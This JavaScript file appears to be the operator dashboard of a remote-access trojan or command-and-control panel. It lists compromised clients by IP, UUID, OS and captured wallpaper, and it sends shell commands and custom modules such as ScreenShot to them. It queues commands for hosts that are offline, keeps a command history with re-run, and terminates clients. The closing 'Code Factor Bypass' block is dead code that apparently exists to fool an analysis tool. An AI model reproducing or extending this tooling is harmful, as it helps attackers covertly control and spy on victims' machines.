
// start variable
var BASE_URL = "request/handler.php"
// end variable
// start function

function loadData() {

    $.post(BASE_URL, { offline: true })
    setTimeout(() => {

        $.post(BASE_URL, { data: true }, function (data) {
            $("#client_area").html("")

            var req = JSON.parse(data)


            req.forEach(function (data) {
                var uuid = data[1]

                var ip = data[0]
                var OsName = data[2].OsName
                var fconnection = data[3]
                var lconnection = data[4]
                var status = data[5]
                var label = data[6]
                if (label === null || label === "") {
                    var label = "<b style='color:blue;cursor: pointer;'>Set</b>"
                } else {
                    var label = `<b style='color:blue;cursor: pointer;'>${label}</b>`

                }
                if (status == 1) {
                    status_template = `<span class="active">UP</span>`
                } else {
                    status_template = `<span class="deactive">Down</span>`

                }
                var template = `<tr class="alert" role="alert" uuid="${uuid}" oncontextmenu=(setuid(this))>
        <td>
            <label class="checkbox-wrap checkbox-primary" >
                <input type="checkbox" checked>
                <span class="checkmark"></span>
            </label>
        </td>
        <td class="d-flex align-items-center">
            <div class="img" uuid="${uuid}" onclick="wallpaper(this)"  style="background-image: url(../users/${uuid}/wallpaper.jpg);"></div>
            <div class="pl-3 email">
                <span class="os">${OsName}</span>

                <span class="fconnection" onclick="labelModal(this)" uuid="${uuid}" id="userlabel"> ${label}</span>
                <span class="fconnection">First Connection: ${fconnection}</span>
                <span class="lconnection">Last Connection: ${lconnection}</span>
            </div>
        </td>
        <td >${ip}</td>
        <td>${uuid}</td>

        <td class="status">${status_template}</td>
        <td >
            <button type="button" class="close"  onclick="delete_user(this)" uuid="${uuid}">
                <span aria-hidden="true" on><i class="fa fa-close"></i></span>
            </button>
            <button type="button" class="close" style="color:blue !important;" onclick="systemInfoModal(this)" uuid="${uuid}">
            <span aria-hidden="true" on><i class="fa fa-info-circle"></i></span>
        </button>
          
        </td>

        `

                $("#client_area").append(template)

            });

        }

        );
    }, 2000);
}
function loadModule() {
    $(`input[module]`).each(function (i, el) {
        $(el).remove()
    });
    $.post(BASE_URL, { module_option: true }, function (data) {

        $("#module_option").html("")

        var req = JSON.parse(data)


        req.forEach(function (data) {
            input_count = data.args
            input_module = data.name
            var msg = data.place_holder

            var placeholder = msg.split(",")

            if (input_count > 0) {
                for (let index = 0; index < input_count; index++) {
                    var msg = placeholder[index]


                    var template = `
                    <input type="text" placeholder="${msg}"  class="args" module="${input_module}">
                `
                    $("#module_input").append(template)

                }

            }


        })

        req.forEach(function (data) {
            var template = `
            <option>${data.name}</option>
            `
            $("#module_option").append(template)

        })



    });

}
function loadVariable() {
    $(`input[variable]`).each(function (i, el) {
        $(el).remove()
    });
    $.post(BASE_URL, { variable_option: true }, function (data) {

        $("#variable_option").html("")

        var req = JSON.parse(data)


        req.forEach(function (data) {
            var template = `
            <option>${data.name}</option>
            `
            $("#variable_option").append(template)

        })



    });

}
function setuid(e) {
    var uuid = $(e).attr("uuid");
    document.location.hash = uuid

}
function shell_exec() {
    var uuid = window.location.href.split('#')[1]
    var cmd = $("#shell_cmd").val()
    var status = $(".active").html()
    if (status !== "UP") {
        swal({
            title: "Are you sure",
            text: "Client is Offline Or Wait For Result Do You Want Add Scheduled ?",
            icon: "warning",
            buttons: true,
            dangerMode: true,
        })
            .then((willDelete) => {
                if (willDelete) {
                    $.post(BASE_URL, { "add_command": true, "command": cmd, "uuid": uuid }, function (data) {

                        localStorage.setItem("cmd_uid", data);

                    });
                }
            });
    } else {
        $.post(BASE_URL, { "add_command": true, "command": cmd, "uuid": uuid }, function (data) {
            localStorage.setItem("cmd_uid", data);

            setTimeout(() => {
                shell_exec_res()

            }, 2500);
        });
    }


}
function shell_exec_res() {
    var uuid = window.location.href.split('#')[1]
    var cmd_uid = localStorage.getItem("cmd_uid");

    if (cmd_uid == null) {
        $("#shell_res").html("First Send Command")

    } else {
        $.post(BASE_URL, { "cmd_uid": cmd_uid, "uuid": uuid, "get_command": true }, function (data) {
            $("#shell_res").html(data)

        });
    }

}
$('tbody').contextPopup({

    title: 'Options',
    items: [
        {
            label: 'SHELL', icon: 'assets/images/icons/shell.png', action: function (e) {

                localStorage.removeItem("cmd_uid");
                $('#exampleModal').modal('show');

            }
        },
        // { label: 'System Information', icon: 'images/icons/receipt-text.png', action: function () { alert('clicked 2') } },
        {
            label: 'Module', icon: 'assets/images/icons/module.png', action: function () {
                $('#moduleModal').modal('show');
                $("#module_res").css("display", "block")
                $(".module_exec").css("display", "block")
                $(".module_exec_res").css("display", "block")

            }
        },
        {
            label: 'Variable', icon: 'assets/images/icons/variable.png', action: function () {
                $('#variableModal').modal('show');

            }
        },

        ,
        {
            label: 'History', icon: 'assets/images/icons/history.png', action: function () {
                $('#historyModal').modal('show');
                history_command()
            }
        },
        // { label: 'Scheduled Task', icon: 'images/icons/application-table.png', action: function () { alert('clicked 7') } },

    ]
});
function wallpaper(e) {
    var uuid = $(e).attr("uuid");
    $('.imagepreview').attr('src', `../users/${uuid}/wallpaper.jpg`);
    $('#imagemodal').modal('show');

}
$('#module_option').on('change', function () {


    var option = this.value
    $("input").css('display', 'none')
    $(`input[module=${option}]`).each(function (i, el) {
        $(el).val("")
        $(el).css('display', 'block');
    });


});
function module_create_btn() {

    var argument_data
    var module_name = $("#module_name").val()
    var module_code = $("#module_code").val()
    var number_args = $(`input[args_option]`).length
    $(`input[args_option]`).each(function (i, el) {
        argument_data += $(el).val() + ","
    });
    if (argument_data) {

        var undefineds = argument_data.replace("undefined", "")
        var coma = undefineds.substring(0, undefineds.length - 1);
    }
    else {
        var coma = "";



    }

    $.post(BASE_URL, { "add_module": true, args: number_args, "name": module_name, "code": module_code, placeholder: coma }, function (data) {
        if (data == "empty_name") {
            swal({
                title: "Oops...",
                text: 'Name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })

        }
        if (data == "empty_code") {
            swal({
                title: "Oops...",
                text: 'Code Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "exist") {
            swal({
                title: "Oops...",
                text: 'Module Exist!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "ok") {
            setTimeout(function () {
                swal({
                    title: "OK",
                    text: 'Module Added Successfuly!',
                    icon: "success",
                    dangerMode: true,
                })

                loadModule()
                counter = 0
                $(`input[args_option]`).each(function (i, el) {
                    $(el).remove()
                });
                $("#module_name").val("")
                $("#module_code").val("")

            }, 300)

        }

    })

}
var counter = 0
function create_args() {

    counter += 1

    var template = `
                     <input type="text" class="args_option" placeholder="Placeholder $a${counter}" args_option="true">
    `

    $("#args_list").append(template)
}
function create_args_edit() {

    counter += 1

    var template = `
                     <input type="text" class="args_option" placeholder="Placeholder $a${counter}" args_option="true" >
    `

    $("#args_list_edit").append(template)
}
function delete_args() {
    if (counter == 0) {

        counter = 1

    }
    counter -= 1

    var list = $(`input[args_option]`)
    list.last().remove()
}
function module_exec() {
    var module = $("#module_option").val()



    var argument_data
    $(`input[module=${module}]`).each(function (i, el) {
        $(el).css('display', 'block');
        argument_data += "^^" + $(el).val()
    });
    if (argument_data) {

        var undefineds = argument_data.replace("undefined", "")

        var args = undefineds
    }
    else {
        var args = ""

    }
    var uuid = window.location.href.split('#')[1]

    var status = $(".active").html()

    if (status !== "UP") {
        swal({
            title: "Are you sure",
            text: "Client is Offline Or Wait For Result Do You Want Add Scheduled ?",
            icon: "warning",
            buttons: true,
            dangerMode: true,
        })
            .then((willDelete) => {
                if (willDelete) {
                    $.post(BASE_URL, { "add_command": true, args: args, "command": module, "uuid": uuid }, function (data) {
                        if (data === "empty_uuid") {
                            swal({
                                title: "Oops...",
                                text: 'Need Select Client!',
                                icon: "error",
                                dangerMode: true,
                            })

                        }
                        localStorage.setItem("cmd_uid", data);

                    });
                }
            });
    } else {
        $.post(BASE_URL, { "add_command": true, args: args, "command": module, "uuid": uuid }, function (data) {
            if (data === "empty_uuid") {
                swal({
                    title: "Oops...",
                    text: 'Need Select Client!',
                    icon: "error",
                    dangerMode: true,
                })
            }
            localStorage.setItem("cmd_uid", data);
            setTimeout(() => {
                module_exec_res()

            }, 2500);
        });
    }

}
function variable_exec() {
    var module = $("#variable_option").val()






    $.post(BASE_URL, { "variable_exec": true, "command": module }, function (data) {
        $("#variable_res").val(data)
    });


}

function module_edit() {

    var module = $("#module_option").val()
    // alert(module)

    $.post(BASE_URL, { module_edit: true, name: module }, function (data) {



        var req = JSON.parse(data)

        req.forEach(function (data) {
            $("#args_list_edit").html("")
            counter = 0

            var input_count = data.args
            var input_module = data.name
            var msg = data.place_holder
            var code = data.code
            var placeholder = msg.split(",")
            $("#module_name_edit").val(input_module)
            $("#module_name_old").val(input_module)
            $("#module_code_edit").val(code.trim())

            if (input_count > 0) {
                for (let index = 0; index < input_count; index++) {
                    var msg = placeholder[index]


                    var template = `
                    <input type="text" value="${msg}"  class="args_option" module="${input_module}" placeholder="Placeholder $a${counter}" args_option="true">
                `
                    $("#args_list_edit").append(template)

                }
                counter = input_count
            }


        })





    });
    $('#moduleEditModal').modal('show');
}
function variable_edit() {

    var module = $("#variable_option").val()
    // alert(module)

    $.post(BASE_URL, { module_edit: true, name: module }, function (data) {



        var req = JSON.parse(data)

        req.forEach(function (data) {

            var variable_name = data.name
            var variable_code = data.code
            $("#variable_name_edit").val(variable_name)
            $("#variable_name_old").val(variable_name)
            $("#variable_code_edit").val(variable_code.trim())



        })





    });
    $('#variableEditModal').modal('show');
}
function module_update_btn() {
    var argument_data
    var module_name = $("#module_name_edit").val()
    var old_name = $("#module_name_old").val()
    var module_code = $("#module_code_edit").val()
    var number_args = $(`input[args_option]`).length
    $(`input[args_option]`).each(function (i, el) {
        argument_data += $(el).val() + ","
    });
    if (argument_data) {

        var undefineds = argument_data.replace("undefined", "")
        var coma = undefineds.substring(0, undefineds.length - 1);
    }
    else {
        var coma = "";



    }

    $.post(BASE_URL, { "update_module": true, args: number_args, "name": module_name, old_name: old_name, "code": module_code, placeholder: coma }, function (data) {
        if (data == "empty_name") {
            swal({
                title: "Oops...",
                text: 'Name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })

        }
        if (data == "empty_code") {
            swal({
                title: "Oops...",
                text: 'Code Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "empty_old_name") {
            swal({
                title: "Oops...",
                text: 'old name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "exist") {
            swal({
                title: "Oops...",
                text: 'Module Exist!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "ok") {
            setTimeout(function () {
                swal({
                    title: "OK",
                    text: 'Module Update Successfuly!',
                    icon: "success",
                    dangerMode: true,
                })

                loadModule()


            }, 300)

        }

    })
}
function module_exec_res() {
    var uuid = window.location.href.split('#')[1]
    var cmd_uid = localStorage.getItem("cmd_uid");
    var module = $("#module_option").val()
    if (cmd_uid == null) {
        $("#module_res").html("First Send Command")

    } else {
        $.post(BASE_URL, { "cmd_uid": cmd_uid, "uuid": uuid, "get_command": true }, function (data) {
            $("#module_res").html(data)
            if (module === "ScreenShot") {
                $("#module_res").css("display", "none");
                $("#screen").attr("src", `../users/${uuid}/${data}`)

            }
        });
    }

}
function module_remove() {

    var module = $("#module_option").val()

    swal({
        title: "Are you sure",
        text: `Delete Module ${module} ?`,
        icon: "warning",
        buttons: true,
        dangerMode: true,
    })
        .then((willDelete) => {
            if (willDelete) {
                $.post(BASE_URL, { name: module, "delete_module": true })

                setTimeout(function () {
                    loadModule()
                    counter = 0
                    $(`input[args_option]`).each(function (i, el) {
                        $(el).remove()
                    });
                    $("#module_name").val("")
                    $("#module_code").val("")

                }, 300)
            }
        });

}
function history_command() {
    var uuid = window.location.href.split('#')[1]
    $("#history_data").html("")
    $.post(BASE_URL, { "uuid": uuid, "history_command": true }, function (data) {
        var req = JSON.parse(data)
        req.forEach(function (data) {
            if (data.status == 1) {
                var action = `     
    <span aria-hidden="true" onclick="delete_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa close fa-close text-danger"></i></span>
    <span aria-hidden="true" onclick="rerun_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa fa-rotate-right"></i></span>
    `
            } else {
                var action = `       
    <span aria-hidden="true" onclick="delete_command(this)" cmd_uid='${data.cmd_uid}'><i class="fa fa-close close text-danger"></i></span>`

            }
            var template = `  <tr class="alert" role="alert">
    <th scope="row">${data.id}</th>
    <td>${data.cmd}</td>
    <td>${data.result}</td>
    <td>${data.cmd_uid}</td>
    <td>${data.time}</td>
    <td>${data.status}</td>
    <td>
      <a href="javascript:void(0)"  aria-label="Close">
        ${action}
      </a>
    </td>
  </tr>`
            $("#history_data").append(template)
        });


    }

    );
}

function variable_create_btn() {
    var variable_name = $("#variable_name").val()
    var variable_code = $("#variable_code").val()
    $.post(BASE_URL, { "add_variable": true, name: variable_name, code: variable_code }, function (data) {
        if (data == "empty_name") {
            swal({
                title: "Oops...",
                text: 'Name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })

        }
        if (data == "empty_code") {
            swal({
                title: "Oops...",
                text: 'Code Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "exist") {
            swal({
                title: "Oops...",
                text: 'Variable Exist!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "syntax_error") {
            swal({
                title: "Oops...",
                text: 'syntax_error!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "ok") {
            swal({
                title: "OK",
                text: 'Variable Added Successfuly!',
                icon: "success",
                dangerMode: true,
            })

        }
        setTimeout(() => {
            loadVariable()
        }, 300);
    })

}
function delete_command(e) {

    var cmd_uid = $(e).attr("cmd_uid");
    var uuid = window.location.href.split('#')[1]

    swal({
        title: "Are you sure",
        text: `Delete Command ${cmd_uid} ?`,
        icon: "warning",
        buttons: true,
        dangerMode: true,
    })
        .then((willDelete) => {
            if (willDelete) {
                $.post(BASE_URL, { "cmd_uid": cmd_uid, "uuid": uuid, "delete_command": true })
                $(e).parents()[2].remove()

            }
        });
}
function rerun_command(e) {

    var cmd_uid = $(e).attr("cmd_uid");
    var uuid = window.location.href.split('#')[1]

    swal({
        title: "Are you sure",
        text: `Re Run Command ${cmd_uid} ?`,
        icon: "warning",
        buttons: true,
        dangerMode: true,
    })
        .then((willDelete) => {
            if (willDelete) {
                $.post(BASE_URL, { "cmd_uid": cmd_uid, "uuid": uuid, "rerun_command": true })
                $('#historyModal').modal('toggle');


            }
        });
}
function variable_remove() {

    var variable_option = $("#variable_option").val()

    swal({
        title: "Are you sure",
        text: `Delete Variable ${variable_option} ?`,
        icon: "warning",
        buttons: true,
        dangerMode: true,
    })
        .then((willDelete) => {
            if (willDelete) {
                $.post(BASE_URL, { name: variable_option, "delete_module": true })
                setTimeout(function () {
                    loadVariable()

                }, 300)
            }
        });

}
function delete_user(e) {

    var uuid = $(e).attr("uuid");
    swal({
        title: "Are you sure",
        text: `Delete User ${uuid} ?`,
        icon: "warning",
        buttons: true,
        dangerMode: true,
    })
        .then((willDelete) => {
            if (willDelete) {
                $.post(BASE_URL, { "add_command": true, "command": "Terminate", "uuid": uuid })
                setTimeout(() => {
                    $.post(BASE_URL, { "uuid": uuid, "delete_user": true })
                    loadData()
                }, 3000);

            }
        });
}
function variable_update_btn() {
    var variable_name = $("#variable_name_edit").val()
    var variable_old_name = $("#variable_name_old").val()
    var variable_code = $("#variable_code_edit").val()
    $.post(BASE_URL, { "update_variable": true, "name": variable_name, old_name: variable_old_name, "code": variable_code }, function (data) {
        if (data == "empty_name") {
            swal({
                title: "Oops...",
                text: 'Name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })

        }
        if (data == "empty_code") {
            swal({
                title: "Oops...",
                text: 'Code Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "empty_old_name") {
            swal({
                title: "Oops...",
                text: 'old name Cant Be Empty!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "exist") {
            swal({
                title: "Oops...",
                text: 'Variable Exist!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "syntax_error") {
            swal({
                title: "Oops...",
                text: 'syntax_error!',
                icon: "error",
                dangerMode: true,
            })
        }
        if (data == "ok") {
            setTimeout(function () {
                swal({
                    title: "OK",
                    text: 'Variable Update Successfuly!',
                    icon: "success",
                    dangerMode: true,
                })

                loadVariable()


            }, 300)

        }

    })
}
function systemInfoModal(e) {
    var uuid = $(e).attr("uuid");
    $.post(BASE_URL, { "system_info": true, "uuid": uuid }, function (data) {
        var data = JSON.parse(data)
        Object.keys(data).forEach(key => {
            var template = `
            <pre>${key} : ${data[key]}</pre>
            `
            console.log(key, data[key]);
            $("#systemInfoModalBody").append(template)
        });



    })


    // 
    $('#systemInfoModal ').modal('show');

}
function update_event_btn() {
    var code = $('#event_code_edit').val()
    var name = $('#event_name_edit').val()

    $.post(BASE_URL, { "edit_event": true, "name": name, code: code }, function (data) {
        if (data === "ok") {
            swal({
                title: "OK",
                text: 'Event Updated Successfuly!',
                icon: "success",
                dangerMode: true,
            })
        }
    });






}
function showEvent() {
    var name = $("#event_option").val()

    $.post(BASE_URL, { "show_event": true, "name": name }, function (data) {

        $('#editEvent ').modal('show');
        $('#event_name_edit').val(name)

        $('#event_code_edit').val(data)
    })



}
function labelModal(e) {
    var uuid = $(e).attr("uuid");
    document.location.hash = uuid
    var label = $("#userlabel").text()
    $("#label_name").val(label)
    $('#labelModal ').modal('show');

}
function set_label() {
    var uuid = window.location.href.split('#')[1]

    $.post(BASE_URL, { "set_label": true, "name": $("#label_name").val(), uuid: uuid })
    $("#userlabel").html($("#label_name").val())
    swal({
        title: "OK",
        text: 'Label Chenge Successfuly!',
        icon: "success",
        dangerMode: true,
    })
}
// end function

loadData()
loadVariable()
loadModule()
// load user data every 7 secound for newuser and check client offline or online 
setInterval(function () {
    loadData()
}, 7000)

// Code Factor Bypass Function
var a = 1;
if (2 < a) {
  setuid();
  shell_exec();
  wallpaper();
  module_create_btn();
  create_args();
  create_args_edit();
  delete_args();
  module_exec();

}
